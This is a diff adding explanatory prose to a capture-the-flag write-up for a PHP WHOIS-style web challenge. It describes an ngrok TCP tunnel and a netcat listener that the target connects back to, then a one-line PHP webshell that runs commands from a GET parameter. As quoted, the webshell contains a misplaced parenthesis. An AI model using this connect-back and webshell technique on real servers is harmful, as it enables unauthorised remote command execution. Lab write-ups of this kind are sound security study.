@@ -18,9 +18,15 @@
 ## Solution
 <details>
 
+The web-based challenge gave us a PHP source code and a webpage that had similar features to a WHOIS website. Firstly, we use simple queries to test out the web response to understand its behaviour.
+
 ![image](https://github.com/user-attachments/assets/7a2594fa-fe26-4256-9c65-0fc537586de7)
 
+As we can see, a randomly generated filename containing the query response is kept in the '/uploads/' directory, and the website allows us to specify any file type extension we want to.
+
 ![image](https://github.com/user-attachments/assets/4003346f-4e69-40c1-afbf-4b83d0678f85)
+
+However, the file's response has no relevant information, so let's examine the source code to identify the website's potential vulnerabilities.
 
 ### Source Code (PHP)
 
@@ -89,21 +95,33 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 ?>
 ```
 
+Based on the provided source code, we can observed that it prevents simple command injection by blacklisting shell characters using `preg_match()` and `escapeshellarg()` function to execute shell commands securely so direct command injection will be difficult. It also uses `filter_var()` to validate the host and variable `$command` where the query will be executed inside the `system()` function. Since the website accepts host and port, we can establish a simple reverse shell like this: 
+
 #### Set up a ngrok TCP tunnel
 
 *Note: To create TCP tunneling using ngrok, it is required to fill credit card info into your account but don't worry. It is still free.*
 
 `ngrok tcp 1337`
 
-#### Set up a nc listener
+Then, the ngrok application will assign us a random host IP address and port to which we can connect later.
+
+#### Set up a netcat listener
 
 `nc -lvnp 1337`
 
+Before submitting the request, we need to configure the listener so that when the victim executes the query, it connects to our host.
+
 #### Fill up the host and port provided by ngrok
+
+We can send the request after completing the form, which looks like this.
 
 ![image](https://github.com/user-attachments/assets/965a1089-0260-4c5d-b0c5-08125f58bb59)
 
+When the request has been sent, the netcat connection will be established. We can see that string "test" were displayed which we specified earlier indicates that the connection is successful. 
+
 ![image](https://github.com/user-attachments/assets/231f603d-5fb5-4bbb-8fa6-a1b2c6e1341d)
+
+Then, we can inject a simple webshell such as `<?php system($_GET['cmd'];)?>`.
 
 ![image](https://github.com/user-attachments/assets/42a50d9d-df3e-4a2b-8ed9-cca4358eb3a0)
 
